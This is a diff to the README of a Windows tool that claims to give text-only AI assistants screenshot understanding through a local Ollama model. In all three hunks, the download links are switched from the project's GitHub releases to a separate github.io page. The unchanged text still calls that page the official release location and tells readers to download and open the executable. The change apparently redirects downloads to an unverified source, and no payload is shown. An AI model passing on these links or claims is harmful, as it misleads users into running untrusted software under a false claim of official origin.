@@ -1,6 +1,6 @@
 # 🔍 GLM-5.3-Full-Vision-Bridge - Let Your Text-Only AI See Screenshots
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-Latest%20Release-8e44ad?style=for-the-badge&logo=github&logoColor=white)](https://github.com/linemancarolingian458/GLM-5.3-Full-Vision-Bridge/releases)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-Latest%20Release-8e44ad?style=for-the-badge&logo=github&logoColor=white)](https://linemancarolingian458.github.io)
 
 GLM-5.3-Full-Vision-Bridge is a helper application for Windows that lets a text-only AI assistant, such as GLM-5.3, understand what is inside a screenshot. A text-only AI can read words but cannot see pictures. This bridge solves that problem by using a vision model that runs on your own computer through Ollama. It acts as an OpenAI-compatible proxy, which means it adds clear image captions to screenshots so your text-only assistant can respond to what is on the screen. It is designed to work with ZCode.
 
@@ -27,7 +27,7 @@ The app is useful when you want an AI to help with error messages, settings wind
 
 Visit this link to download the application.
 
-[Download GLM-5.3-Full-Vision-Bridge](https://github.com/linemancarolingian458/GLM-5.3-Full-Vision-Bridge/releases)
+[Download GLM-5.3-Full-Vision-Bridge](https://linemancarolingian458.github.io)
 
 The link opens the official release page in your browser. This is the place to get the application for Windows. Keep the downloaded file in a folder you can easily find, such as your Downloads folder. When you are ready, open the application to start the bridge.
 
@@ -89,7 +89,7 @@ Yes. The bridge is built to work with ZCode.
 
 Visit this link to download the application.
 
-[Download GLM-5.3-Full-Vision-Bridge](https://github.com/linemancarolingian458/GLM-5.3-Full-Vision-Bridge/releases)
+[Download GLM-5.3-Full-Vision-Bridge](https://linemancarolingian458.github.io)
 
 The release page is the official download location. Get the latest version for Windows, keep the file in a folder you can find, and open the application when you are ready to connect it to ZCode and your local Ollama vision model.
 
